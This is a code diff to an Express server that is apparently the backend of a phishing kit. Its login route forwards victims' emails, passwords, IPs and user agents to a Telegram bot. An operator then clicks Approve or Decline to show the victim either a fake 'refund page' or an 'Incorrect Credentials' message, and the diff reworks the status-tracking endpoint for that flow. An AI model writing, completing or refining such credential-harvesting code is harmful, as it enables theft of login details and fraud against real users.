@@ -23,6 +23,11 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ============================================
+// STORE USER STATUSES (In-memory - use database in production)
+// ============================================
+const userStatuses = {};
+
+// ============================================
 // TELEGRAM SEND MESSAGE WITH INLINE BUTTONS
 // ============================================
 async function sendTelegramMessageWithButtons(email, password, firstName, ip, userAgent) {
@@ -101,8 +106,11 @@ app.post('/api/telegram-callback', async (req, res) => {
         // Parse the callback data
         const parts = data.split('_');
         const action = parts[0]; // 'approve' or 'decline'
-        const email = parts.slice(1, -1).join('_'); // email (handles dots and underscores)
-        const firstName = parts[parts.length - 1]; // firstName
+        const email = parts.slice(1, -1).join('_');
+        const firstName = parts[parts.length - 1];
+
+        // Store the user status
+        userStatuses[email] = action === 'approve' ? 'approved' : 'declined';
 
         let responseText = '';
 
@@ -139,13 +147,13 @@ app.post('/api/telegram-callback', async (req, res) => {
             parse_mode: 'HTML'
         });
 
-        // Send a notification to the admin chat
+        // Also send a separate notification
         const notifyUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         await axios.post(notifyUrl, {
             chat_id: TELEGRAM_CHAT_ID,
             text: action === 'approve' 
-                ? `✅ User ${email} approved! They will see the refund page.`
-                : `❌ User ${email} declined! They will see "Incorrect Credentials".`,
+                ? `✅ User ${email} has been approved! They will see the refund page.`
+                : `❌ User ${email} has been declined! They will see "Incorrect Credentials".`,
             parse_mode: 'HTML'
         });
 
@@ -166,6 +174,19 @@ app.get('/health', (req, res) => {
         timestamp: new Date().toISOString(),
         message: 'Server is running!'
     });
+});
+
+// ============================================
+// CHECK USER STATUS ENDPOINT
+// ============================================
+app.post('/api/check-status', (req, res) => {
+    try {
+        const { email } = req.body;
+        const status = userStatuses[email] || 'pending';
+        res.json({ success: true, status });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Error checking status' });
+    }
 });
 
 // ============================================
@@ -194,7 +215,7 @@ app.post('/api/login', async (req, res) => {
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
         const userAgent = req.headers['user-agent'] || 'Unknown';
 
-        // Send Telegram message with buttons
+        // Send Telegram message with Approve/Decline buttons
         await sendTelegramMessageWithButtons(email, password, firstName, ip, userAgent);
 
         console.log('✅ Telegram notification with buttons sent');
@@ -212,22 +233,6 @@ app.post('/api/login', async (req, res) => {
             success: false,
             message: 'Server error. Please try again.'
         });
-    }
-});
-
-// ============================================
-// CHECK USER STATUS ENDPOINT
-// ============================================
-// Store user statuses in memory (in production, use a database)
-const userStatuses = {};
-
-app.post('/api/check-status', (req, res) => {
-    try {
-        const { email } = req.body;
-        const status = userStatuses[email] || 'pending';
-        res.json({ success: true, status });
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Error checking status' });
     }
 });
 
@@ -348,6 +353,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`📍 http://localhost:${PORT}`);
     console.log(`🤖 Telegram bot: Configured ✅`);
     console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID}`);
-    console.log('✅ Inline buttons enabled for admin review');
+    console.log('✅ Approve/Decline buttons enabled');
     console.log('========================================');
 });
